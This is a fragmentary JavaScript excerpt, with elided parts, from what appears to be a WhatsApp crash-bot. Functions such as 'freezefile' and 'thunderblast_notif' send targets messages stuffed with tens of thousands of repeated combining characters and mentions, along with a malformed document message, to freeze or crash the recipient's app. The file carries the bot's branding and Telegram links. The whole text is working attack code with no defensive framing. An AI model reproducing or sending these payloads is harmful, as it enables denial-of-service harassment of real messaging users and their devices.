...
let virtex = "Wanna With Yours :D " + "ྫྷ".repeat(77777) + "@0".repeat(50000);
            ...
            console.log(chalk.red.bold('Motupatalu'))
   	};
async function freezefile(target, QBug, Ptcp = true) {
    let virtex = "MOTU PATLU :D " + "ြ".repeat(25000);
    await Jojoo.relayMessage(target, {
        groupMentionedMessage: {
            message: {
                interactiveMessage: {
...
async function thunderblast_notif(target) {
			await Jojoo.relayMessage(target, {
                ...
                pageCount: 1316134911,
                mediaKey: "45P/d5blzDp2homSAvn86AaCzacZvOBYKO8RDkx5Zec=",
                fileName: "🩸⃟༑⌁⃰《《   ֎ ⃢☠️☠️ 𝗕𝗥𝗨𝗧𝗔𝗟𝗜𝗧𝗬 ☠️‼️❌⚠️‼️🚫‼️‼️‼️〄 ⃢🔥 ²⁰²⁵》》Ꮤ𐋅𐌀𐌕𐌔𐌀𐌓𐌓 ᭢ꫀ᭙ཀ͜͡🦠͟",
                fileEncSha256: "LEodIdRH8WvgW6mHqzmPd+3zSR61fXJQMjf3zODnHVo=",
                directPath: "/v/t62.7119-24/30958033_897372232245492_2352579421025151158_n.enc?ccb=11-4&oh=01_Q5AaIOBsyvz-UZTgaU-GUXqIket-YkjY-1Sg28l04ACsLCll&oe=67156C73&_nc_sid=5e03e0",
                mediaKeyTimestamp: "1726867151",
											contactVcard: true,
          ...
          extendedTextMessage: {
            ...
            contextInfo: {
              ...
              externalAdReply: {
                ...
                sourceType: " x ",
                sourceId: " x ",
                sourceUrl: "https://t.me/@MotuspatlubugBot",
                mediaUrl: "https://t.me/MotuspatlubugBot",
                containsAutoReply: true,
                renderLargerThumbnail: true,
                showAdAttribution: true,
                ctwaClid: "ctwa_clid_example",
